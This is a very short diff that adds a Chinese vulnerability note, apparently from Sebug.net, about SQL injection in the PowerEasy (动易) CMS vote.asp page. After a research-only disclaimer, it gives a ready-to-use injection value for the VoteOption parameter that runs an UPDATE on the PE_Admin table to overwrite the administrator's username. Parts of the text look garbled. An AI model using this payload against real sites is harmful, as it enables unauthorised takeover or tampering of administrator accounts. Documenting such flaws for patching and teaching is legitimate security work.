@@ -1,0 +1,6 @@
+动易vote.asp注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.VoteOption的值为1=1 update PE_Admin set adminname=0x61-;-时，修改管理员的用户名。
